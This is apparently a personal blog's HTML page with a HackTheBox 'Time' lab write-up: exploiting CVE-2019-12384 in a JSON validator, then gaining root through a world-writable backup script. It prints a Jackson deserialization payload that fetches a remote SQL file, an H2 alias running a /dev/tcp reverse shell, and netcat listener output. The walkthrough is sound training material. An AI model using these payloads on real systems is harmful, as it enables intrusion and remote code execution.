@@ -1,0 +1,635 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.3 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Write-up: HackTheBox - Time - #keepLearning</title>
+<meta name="description" content="Medium rated box, being more on the easier side of it that involves exploiting a CVE to get a shell and editing a script that is run as root for priv esc.">
+
+
+  <meta name="author" content="Philipp Menner">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="#keepLearning">
+<meta property="og:title" content="Write-up: HackTheBox - Time">
+<meta property="og:url" content="http://localhost:4000/boxes/Time/">
+
+
+  <meta property="og:description" content="Medium rated box, being more on the easier side of it that involves exploiting a CVE to get a shell and editing a script that is run as root for priv esc.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-04-02T21:33:36-04:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/boxes/Time/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Philipp Menner",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="#keepLearning Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/88x88.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          #keepLearning
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Write-up: HackTheBox - Time">
+    <meta itemprop="description" content="Medium rated box, being more on the easier side of it that involves exploiting a CVE to get a shell and editing a script that is run as root for priv esc.">
+    <meta itemprop="datePublished" content="2021-04-02T21:33:36-04:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Write-up: HackTheBox - Time
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  5 minute read
+
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-cog"></i> Table of Contents</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#overview">Overview</a></li>
+  <li><a href="#getting-a-shell-on-the-box-user-flag">Getting a shell on the box, user flag</a></li>
+  <li><a href="#root">Root</a></li>
+  <li><a href="#appendix">Appendix</a>
+    <ul>
+      <li><a href="#-about-file-and-directory-permissions"> About file and directory permissions</a></li>
+      <li><a href="#-nmap-scan"> Nmap scan</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="overview">Overview</h1>
+<p>This is a brief walkthrough for the box <a href="https://app.hackthebox.eu/machines/Time">Time</a> from <a href="https://www.hackthebox.eu">HackTheBox</a> with some remarks on <a href="#permissions">file/directory permissions</a> in the appendix.</p>
+<h1 id="getting-a-shell-on-the-box-user-flag">Getting a shell on the box, user flag</h1>
+<p><a href="/assets/images/time/web_page.png"><img src="/assets/images/time/web_page.png" alt="web" height="360px" width="180px" class="align-right" /></a>
+As only <a href="#nmap">port 22 and 80 are open</a> we take a look at the website and find an online beautifier and validator.
+Clicking around will soon reveal an error message. For example, entering a single quote and selecting <code class="language-plaintext highlighter-rouge">Validate (beta!)</code> triggers an error message which contains <code class="language-plaintext highlighter-rouge">com.fasterxml.jackson.core.JsonParseException</code>.
+Researching this error for a bit leads us to <a href="https://github.com/jas502n/CVE-2019-12384">CVE-2019-12384</a> and following the steps outlined on the github page allows us to execute arbitrary code to get a shell on the box.<br />
+First we need to create the <code class="language-plaintext highlighter-rouge">.sql</code> file which we will then host via the python http server. In this sql file, we simply need to change the argument of <code class="language-plaintext highlighter-rouge">SHELLEXEC()</code> in the last line to what we wish to run:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">cat</span> <span class="n">reverse</span><span class="p">.</span><span class="k">sql</span>
+<span class="k">CREATE</span> <span class="k">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="k">AS</span> <span class="err">$$</span> <span class="n">String</span> <span class="n">shellexec</span><span class="p">(</span><span class="n">String</span> <span class="n">cmd</span><span class="p">)</span> <span class="n">throws</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">IOException</span> <span class="err">{</span>
+	<span class="n">String</span><span class="p">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="err">{</span><span class="nv">"bash"</span><span class="p">,</span> <span class="nv">"-c"</span><span class="p">,</span> <span class="n">cmd</span><span class="err">}</span><span class="p">;</span>
+	<span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="n">command</span><span class="p">).</span><span class="n">getInputStream</span><span class="p">()).</span><span class="n">useDelimiter</span><span class="p">(</span><span class="nv">"</span><span class="se">\\</span><span class="nv">A"</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">hasNext</span><span class="p">()</span> <span class="o">?</span> <span class="n">s</span><span class="p">.</span><span class="k">next</span><span class="p">()</span> <span class="p">:</span> <span class="nv">""</span><span class="p">;</span>  <span class="err">}</span>
+<span class="err">$$</span><span class="p">;</span>
+<span class="k">CALL</span> <span class="n">SHELLEXEC</span><span class="p">(</span><span class="s1">'sh -i &gt;&amp; /dev/tcp/10.10.14.6/1234 0&gt;&amp;1'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>To retrieve and execute this file we then need to slightly adjust the serialized payload that’s passed to the <code class="language-plaintext highlighter-rouge">test.rb</code> file in the github page:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nl">"url"</span><span class="p">:</span><span class="s2">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.6:8000/reverse.sql'"</span><span class="p">}]</span><span class="w">
+</span></code></pre></div></div>
+<p>Pasting it into the <code class="language-plaintext highlighter-rouge">Validate (beta!)</code> field after setting up a local http server using python and a netcat listener:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python <span class="nt">-m</span> http.server
+<span class="go">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.214 - - [09/Mar/2021 10:58:53] "GET /reverse.sql HTTP/1.1" 200 -
+
+</span><span class="gp"> $</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 1234
+<span class="go"> Ncat: Version 7.91 ( https://nmap.org/ncat )
+ Ncat: Listening on :::1234
+ Ncat: Listening on 0.0.0.0:1234
+ Ncat: Connection from 10.10.10.214.
+ Ncat: Connection from 10.10.10.214:55502.
+</span><span class="gp"> sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="gp"> $</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go"> css
+ fonts
+ images
+ index.php
+ js
+ vendor
+</span><span class="gp"> $</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go"> pericles
+</span><span class="gp"> $</span><span class="w"> </span><span class="nb">cd</span> /home/pe<span class="k">*</span>
+<span class="gp"> $</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go"> snap
+ user.txt
+</span></code></pre></div></div>
+<p>we notice command execution and get a shell back as <code class="language-plaintext highlighter-rouge">pericles</code>.
+We can now collect the user flag.</p>
+
+<h1 id="root">Root</h1>
+<p>First I upgrade to a ssh shell by echoing my public ssh key into the <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code>. As <code class="language-plaintext highlighter-rouge">sudo -l</code> requires a password we do not have and the home directory of pericles is pretty much empty I upload <a href="https://github.com/DominicBreuker/pspy">pspy</a> to see if any interesting processes are running, and indeed there are:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">pericles@time:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">[sudo] password for pericles:
+Sorry, try again.
+</span><span class="gp">pericles@time:~$</span><span class="w"> </span>./pspy64
+<span class="go">[snip]
+CMD: UID=0    PID=15551  | zip -r website.bak.zip /var/www/html
+CMD: UID=0    PID=15528  | mv website.bak.zip /root/backup.zip
+</span></code></pre></div></div>
+<p>The user with UID 0 (root) zips <code class="language-plaintext highlighter-rouge">/var/www/html</code> to <code class="language-plaintext highlighter-rouge">/website.bak.zip</code> and moves it into the root folder, which is quickly confirmed by:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>pericles@time:/var/www/html<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">ls</span> / | <span class="nb">grep </span>website<span class="p">;</span> <span class="k">done</span>
+<span class="go">website.bak.zip
+</span></code></pre></div></div>
+<p>I thought for a few minutes if there’s a path vulnerability or anything I could put into the html folder to exploit but as the zip file doesn’t seem to get extracted that shouldn’t be possible. I then noticed another command thats run by root:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>15548  | /bin/bash /usr/bin/timer_backup.sh
+</code></pre></div></div>
+<p>I started by looking at the file’s permissions and to my surprise the file is owned by our user - which is rather unusual, because we cannot create files in <code class="language-plaintext highlighter-rouge">/usr/bin</code> - giving us full access to the file. More on that <a href="#permissions">here</a>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-al</span> <span class="nb">time</span><span class="k">*</span>
+<span class="go">-rwxr-xr-x 1 root     root     14720 Apr 21  2017 time
+-rwxr-xr-x 1 root     root     43080 Apr 22  2020 timedatectl
+-rwxr-xr-x 1 root     root     43800 Sep  5  2019 timeout
+-rwxrw-rw- 1 pericles pericles    88 Mar  9 16:15 timer_backup.sh
+</span></code></pre></div></div>
+<p>For simplicity I simply collected the root flag via <code class="language-plaintext highlighter-rouge">cat</code> but we really have all options here, as the file is executed as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /usr/bin/timer_backup.sh
+<span class="gp">#</span><span class="o">!</span>/bin/bash
+<span class="go">zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip
+
+[replaced by]
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /usr/bin/timer_backup.sh
+<span class="gp">#</span><span class="o">!</span>/bin/bash
+<span class="gp">cat /root/root.txt &gt;</span><span class="w"> </span>/tmp/.flag
+<span class="go">
+</span><span class="gp">pericles@time:/tmp$</span><span class="w"> </span><span class="nb">cat</span> .flag
+<span class="go">258535e5056435406f3d85114a2819b8
+</span></code></pre></div></div>
+<h1 id="appendix">Appendix</h1>
+<h2 id="-about-file-and-directory-permissions"><a name="permissions"></a> About file and directory permissions</h2>
+<p>Interestingly enough <code class="language-plaintext highlighter-rouge">timer_backup.sh</code> is owned by user and group <code class="language-plaintext highlighter-rouge">pericles</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">-rwxrw-rw- 1 pericles pericles    88 Mar  9 16:15 timer_backup.sh
+
+So reading the permissions from left to right: rwx rw- rw- 
+</span><span class="gp">First three bits -&gt;</span><span class="w"> </span>owner 		-&gt; <span class="nb">read</span>, write and execute
+<span class="gp"> Next three bits -&gt;</span><span class="w"> </span>group 		-&gt; <span class="nb">read </span>and write
+<span class="gp"> Last three bits -&gt;</span><span class="w"> </span>everybody <span class="k">else</span> 	-&gt; <span class="nb">read </span>and write
+</code></pre></div></div>
+<p>Interestingly enough, because <code class="language-plaintext highlighter-rouge">/usr/bin/</code> is not a directory we are allowed to create files in:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">pericles@time:/usr/bin$</span><span class="w"> </span><span class="nb">touch </span>file
+<span class="go">touch: cannot touch 'file': Permission denied
+</span></code></pre></div></div>
+<p>So probably the file was created here by root and he then changed the ownership and group to <code class="language-plaintext highlighter-rouge">pericles</code>. <br />
+As we have the write bit set on the <em>file</em> but not on its parent directory we can therefore make changes to the content of the file but not to the file itself:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">pericles@time:/usr$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 96
+drwxr-xr-x   2 root root 36864 Feb  9 14:42 bin
+[snip]
+
+</span><span class="gp">pericles@time:/usr$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
+</span></code></pre></div></div>
+<p>As we neither are root nor in the root group, the execute bit - which allows us to enter the directory - and the read bit - which allows us to list the contents of the directory - are set for us. Thus we are not allowed to create new files nor remove existing ones even if these files are owned by us (which allows us to set file permissions however we like) because that would change the content of the directory and for this we need the write bit of the parent directory to be enabled - which can be done using <code class="language-plaintext highlighter-rouge">chmod o+w /usr/bin</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">pericles@time:/usr/bin$</span><span class="w"> </span><span class="nb">rm </span>timer_backup.sh
+<span class="go">rm: cannot remove 'timer_backup.sh': Permission denied
+
+</span><span class="gp">root@time:/#</span><span class="w"> </span><span class="nb">chmod </span>o+w /usr/bin/  <span class="c"># write bit for users who aren't the owner/in the group of the file</span>
+<span class="go">chmod o+w /usr/bin/		
+
+</span><span class="gp">pericles@time:/usr/bin$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-al</span> /usr/
+<span class="go">total 104
+drwxr-xr-x  14 root root  4096 Apr 23  2020 .
+drwxr-xr-x  20 root root  4096 Apr  3 10:10 ..
+drwxr-xrwx   2 root root 36864 Apr  3 10:09 bin
+
+</span><span class="gp">pericles@time:/usr/bin$</span><span class="w"> </span><span class="nb">rm </span>timer_backup.sh
+<span class="gp">pericles@time:/usr/bin$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="-nmap-scan"><a name="nmap"></a> Nmap scan</h2>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> 10.10.10.214
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 04:44 EDT
+Nmap scan report for 10.10.10.214
+Host is up (0.035s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 18.68 seconds
+</span></code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#boxes" class="page__taxonomy-item" rel="tag">boxes</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-04-02T21:33:36-04:00">April 2, 2021</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Write-up%3A+HackTheBox+-+Time%20http%3A%2F%2Flocalhost%3A4000%2Fboxes%2FTime%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fboxes%2FTime%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fboxes%2FTime%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/challenges/RopMe/" class="pagination--pager" title="Write-up: HackThebox - RopMe
+">Previous</a>
+    
+    
+      <a href="/boxes/Schooled/" class="pagination--pager" title="Writeup: HackTheBox - Schooled
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/boxes/Schooled/" rel="permalink">Writeup: HackTheBox - Schooled
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  8 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Write-up of the box Schooled from Hack The Box
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/challenges/RopMe/" rel="permalink">Write-up: HackThebox - RopMe
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  6 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">A challenge to practice return-oriented programming.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/boxes/travel/" rel="permalink">Write-up: HackTheBox - Travel
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  8 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Cool box with little guessing and much to learn.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/boxes/player2/" rel="permalink">Write-up: HackTheBox - PlayerTwo
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  25 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">One of those boxes where every step was very hard for me. It took me weeks and some nudges to complete but it taught me a lot!
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Philipp Menner. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
